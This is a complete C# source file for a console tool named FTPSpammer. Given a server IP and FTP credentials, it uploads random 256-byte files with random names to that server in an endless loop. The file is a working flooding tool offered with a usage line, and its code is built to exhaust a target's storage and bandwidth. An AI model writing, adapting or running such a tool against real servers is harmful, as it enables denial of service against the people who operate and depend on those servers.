using System;
using System.Linq;
using System.Net;
using System.Security.Cryptography;

namespace FTPSpammer
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: FTPSpammer.exe <Remote server IP> <Username> <Password>");
                Environment.Exit(-1);
            }

            string RandStr(int Len)
            {
                var Chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
                return new string(Enumerable.Repeat(Chars, Len).Select(s => s[new Random().Next(s.Length)]).ToArray());
            }

            while (true)
            {
                byte[] Buf = new byte[0x100];
                new RNGCryptoServiceProvider().GetBytes(Buf);
                new WebClient{Credentials = new NetworkCredential(args[1], args[2])}.UploadData($"ftp://{args[0]}/{RandStr(32)}", Buf);
            }
        }
    }
}